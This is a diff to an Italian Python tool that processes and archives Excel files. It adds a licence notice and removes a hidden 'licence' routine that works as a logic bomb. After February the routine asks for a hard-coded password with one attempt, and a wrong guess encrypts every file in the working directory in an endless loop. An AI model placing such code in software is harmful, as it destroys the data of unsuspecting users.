@@ -9,6 +9,12 @@ file.xlsx(excel) elaborato denominato(ordine_h#m). Se si spunta la checkbox arch
 viene creata un'altra cartella denominata(archivioY-M-D) al cui interno viene posizionato il 
 file originale(precedentemente elaborato) denominato(D-hfile.xlsx). Se si spunta la checkbox 
 invia email, sarà inoltrato il file.xlsx elaborato.
+
+DESTINAZIONE: programma creato da Simone Tempesta, il quale è l'unico proprietario, qual'ora 
+            si venga in possesso di tale strumento, non si è autorizzati all'uso 
+            (PROPRIETA INTELLETTUALE).
+            Non si garantisce il corretto funzionamento, sempre o per sempre.
+            Licenza valida fino al 12-03-2022.
                                 
                                 USO:
 1)Premi il pulsante Seleziona e sciegli la cartella dove si trova il file.xlsx da elaborare
@@ -222,66 +228,6 @@ def invia_mail(new_directory, file_output):
 
 #Variabili
 data_ora = datetime.now().strftime('%Y-%m-%d %H#%M#%S')
-
-##LICENZA
-
-chiave = "MiDispiaceDevoAndare"
-mese_corrente = data_ora[5:7]
-lista_del_file = []
-def write_key():
-    # GENERO LA CHIAVE E LA SALVO IN UN FILE
-    key = Fernet.generate_key()
-    with open("key.key", "wb") as key_file:
-        key_file.write(key)
-
-def load_key():
-    # CARICO LA CHIAVE DAL FILE
-    return open("key.key", "rb").read()
-
-def encrypt(filename, key):
-    """
-    DATO IL NOME DI UN FILE, LO CRIPTA E LO RISCRIVE
-    """
-    f = Fernet(key)
-    with open(filename, "rb") as file:
-        # LEGGO IL CONTENUTO DEL FILE
-        file_data = file.read()
-        # CRIPTO IL FILE
-        encrypted_data = f.encrypt(file_data)
-        # RISCRIVO IL FILE CON IL CONTENUTO CRIPTATO
-        with open(filename, "wb") as file:
-            file.write(encrypted_data)
-
-def controllo():
-    print("Attenzione se inserisci la password errata il programma non sarà più utilizzabbile!\n"
-          "HAI SOLO UN TENTATIVO!!!")
-    pw_input = input("inserisci password: ")
-    if pw_input != chiave:
-        distruzione()
-
-
-def elimina_key():
-    program_path = str(os.getcwd())
-    path_key = f"{program_path}\key.key"
-    os.remove(f"{path_key}\key.key")
-
-def distruzione():
-    write_key()
-    key = load_key()
-    program_path = str(os.getcwd())
-    lista_del_file = os.listdir(program_path)
-    path_key = f"{program_path}\key.key"
-    program_name = os.path.basename(__file__)
-    program = f"{program_path}\{program_name}"
-    while True:
-            for file in lista_del_file:
-                if os.path.isfile(f"{program_path}\{file}"):
-                    encrypt(file, key)
-
-if int(mese_corrente) > 2:
-    try: controllo()
-    except: elimina_key()
-###Fine licenza
 
 ###MAIN
 def main(percorso):
